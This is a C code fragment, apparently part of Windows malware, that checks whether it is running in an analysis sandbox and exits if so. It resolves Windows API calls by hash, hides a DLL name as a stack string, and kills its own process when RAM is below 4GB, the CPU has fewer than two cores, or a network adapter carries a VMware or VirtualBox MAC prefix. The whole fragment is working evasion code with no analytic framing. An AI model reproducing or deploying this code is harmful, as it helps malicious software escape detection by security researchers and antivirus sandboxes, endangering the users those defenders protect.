    P_GlobalMemoryStatusEx pGlobalMemoryStatusEx = (P_GlobalMemoryStatusEx)get_func_by_hash(hKernel32, H_GlobalMemoryStatusEx);
    if (pGlobalMemoryStatusEx) {
        MEMORYSTATUSEX ms;
        ms.dwLength = sizeof(ms);
        pGlobalMemoryStatusEx(&ms);
        if (ms.ullTotalPhys < 4294967296ULL) { // 4GB
             pTerminateProcess((HANDLE)-1, 0);
        }
    }
    
    // 2. Check CPU Cores (>= 2)
    P_GetSystemInfo pGetSystemInfo = (P_GetSystemInfo)get_func_by_hash(hKernel32, H_GetSystemInfo);
    if (pGetSystemInfo) {
        SYSTEM_INFO si;
        pGetSystemInfo(&si);
        if (si.dwNumberOfProcessors < 2) {
             pTerminateProcess((HANDLE)-1, 0);
        }
    }
    
    // 3. Check MAC Address
    // "Iphlpapi.dll" stack string
    char s_iphlp[] = {'I','p','h','l','p','a','p','i','.','d','l','l', 0};
    HMODULE hIphlp = pLoadLibraryA(s_iphlp);
    if (hIphlp) {
        P_GetAdaptersInfo pGetAdaptersInfo = (P_GetAdaptersInfo)get_func_by_hash(hIphlp, H_GetAdaptersInfo);
        if (pGetAdaptersInfo) {
            IP_ADAPTER_INFO *info = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
            ULONG len = sizeof(IP_ADAPTER_INFO);
            if (pGetAdaptersInfo(info, &len) == ERROR_BUFFER_OVERFLOW) {
                free(info);
                info = (IP_ADAPTER_INFO*)malloc(len);
            }
            if (pGetAdaptersInfo(info, &len) == NO_ERROR) {
                PIP_ADAPTER_INFO p = info;
                while (p) {
                    // VMware: 00:0C:29, VBox: 08:00:27
                    if (p->AddressLength == 6) {
                        if (p->Address[0] == 0x00 && p->Address[1] == 0x0C && p->Address[2] == 0x29) pTerminateProcess((HANDLE)-1, 0);
                        if (p->Address[0] == 0x08 && p->Address[1] == 0x00 && p->Address[2] == 0x27) pTerminateProcess((HANDLE)-1, 0);
                    }
                    p = p->Next;
                }
            }
            free(info);
        }
    }
